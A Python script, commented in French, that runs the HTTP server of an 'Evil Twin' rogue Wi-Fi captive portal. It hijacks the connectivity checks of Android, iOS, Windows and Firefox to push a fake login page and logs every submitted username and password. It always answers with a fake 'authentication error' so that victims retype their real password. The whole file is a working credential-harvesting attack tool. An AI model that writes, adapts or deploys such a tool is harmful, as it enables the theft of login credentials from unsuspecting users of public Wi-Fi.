#!/usr/bin/env python3
"""Serveur HTTP du portail captif Evil Twin.

Usage : sudo python3 captive_server.py <portal_dir> <creds_log>

Sert les fichiers HTML du portail + intercepte les POST de credentials
+ répond "OK" à TOUS les checks captive portal des OS (Android, iOS, Windows).
"""

import os
import sys
import datetime
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer

PORTAL_DIR = sys.argv[1] if len(sys.argv) > 1 else "./portal"
CREDS_LOG = sys.argv[2] if len(sys.argv) > 2 else "./creds.txt"


class CaptiveHandler(BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        # silencieux
        pass

    def _serve_file(self, filename, content_type="text/html"):
        path = os.path.join(PORTAL_DIR, filename)
        if not os.path.exists(path):
            self.send_error(404); return
        with open(path, "rb") as f:
            content = f.read()
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(content)))
        self.end_headers()
        self.wfile.write(content)

    def _serve_portal(self):
        self._serve_file("index.html")

    def do_GET(self):
        # Détection des checks captive portal — répondre comme attendu pour
        # déclencher le popup "se connecter au réseau" sur l'OS du client
        host = self.headers.get("Host", "").lower()
        path = self.path.lower()

        # Android captive portal check (depuis Android 5)
        if "connectivitycheck" in host or "generate_204" in path:
            self.send_response(302)
            self.send_header("Location", "http://10.0.0.1/")
            self.end_headers()
            return

        # iOS / macOS
        if "captive.apple.com" in host:
            self.send_response(302)
            self.send_header("Location", "http://10.0.0.1/")
            self.end_headers()
            return

        # Windows
        if "msftconnecttest" in host or "msftncsi" in host:
            self.send_response(302)
            self.send_header("Location", "http://10.0.0.1/")
            self.end_headers()
            return

        # Firefox
        if "detectportal.firefox.com" in host:
            self.send_response(302)
            self.send_header("Location", "http://10.0.0.1/")
            self.end_headers()
            return

        # Assets statiques du portail
        if path.endswith((".css", ".js", ".png", ".jpg", ".jpeg", ".svg", ".ico", ".woff", ".woff2")):
            fname = os.path.basename(path)
            ct = "text/css" if fname.endswith(".css") else \
                 "application/javascript" if fname.endswith(".js") else \
                 "image/png" if fname.endswith(".png") else \
                 "image/jpeg" if fname.endswith((".jpg", ".jpeg")) else \
                 "image/svg+xml" if fname.endswith(".svg") else \
                 "image/x-icon" if fname.endswith(".ico") else \
                 "application/octet-stream"
            self._serve_file(fname, ct)
            return

        # Tout le reste → portail
        self._serve_portal()

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="ignore")
        params = urllib.parse.parse_qs(body)

        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip = self.client_address[0]
        ua = self.headers.get("User-Agent", "?")[:80]

        # Log structuré
        with open(CREDS_LOG, "a") as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"[{ts}] from {client_ip}  ({ua})\n")
            f.write(f"Path: {self.path}\n")
            for k, v in params.items():
                for val in v:
                    f.write(f"  {k} = {val}\n")
            f.write(f"  raw body: {body[:300]}\n")

        # Affichage console aussi
        print(f"\n[!] CREDS captured @ {ts} from {client_ip}:")
        for k, v in params.items():
            for val in v:
                print(f"  {k} = {val}")

        # Réponse : on simule l'erreur "réessayez" pour qu'ils retentent
        # (le 1er essai est souvent un mdp test, le 2e le vrai)
        # OU on simule succès + redirect vers la vraie page
        response = """<!DOCTYPE html>
<html><head><title>Connexion</title>
<style>body{font-family:sans-serif;text-align:center;padding:50px;background:#f5f5f5}
h1{color:#c33}p{color:#666}</style></head>
<body>
<h1>Erreur d'authentification</h1>
<p>Vos identifiants n'ont pas pu être vérifiés. Veuillez réessayer.</p>
<p><a href="javascript:history.back()">Retour</a></p>
</body></html>"""
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(response)))
        self.end_headers()
        self.wfile.write(response.encode())


def main():
    if not os.path.isdir(PORTAL_DIR):
        print(f"ERR: portal dir {PORTAL_DIR} introuvable")
        sys.exit(1)
    if not os.path.exists(os.path.join(PORTAL_DIR, "index.html")):
        print(f"ERR: {PORTAL_DIR}/index.html introuvable")
        sys.exit(1)

    server = HTTPServer(("0.0.0.0", 80), CaptiveHandler)
    print(f"[+] Captive portal server on :80")
    print(f"[+] Portal dir : {PORTAL_DIR}")
    print(f"[+] Creds log  : {CREDS_LOG}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
